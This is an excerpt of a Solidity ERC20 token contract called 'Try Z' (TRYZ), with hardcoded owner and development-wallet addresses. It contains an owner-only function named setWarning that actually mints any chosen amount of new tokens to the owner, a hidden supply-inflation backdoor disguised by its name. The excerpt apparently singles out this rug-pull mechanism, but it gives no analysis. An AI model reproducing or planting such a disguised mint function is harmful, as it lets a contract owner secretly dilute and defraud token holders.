...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x3d017fa88e109E3a34dD47279bb11A2F960F8e37;
...
contract TRYZ is Context, IERC20, Ownable {
    ...
    address private _developmentWalletAddress = 0x7AD307905a7EADC2A5301e13A17d9C08747d1F45;
    uint256 private constant MAX = ~uint256(0);
    uint256 public _tTotal = 1000000000000000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = "Try Z";
    string private _symbol = "TRYZ";
    ...
    uint256 public _maxTxAmount = 7500000000000 * 10**18;
    ...
    function setMexTxAmount(uint256 maxTxAmount) external onlyOwner() {
    ...
    function setWarning(uint256 _addAmount) external onlyOwner()  {
        _tTotal += _addAmount;
        emit Transfer(address(0), owner(), _addAmount);
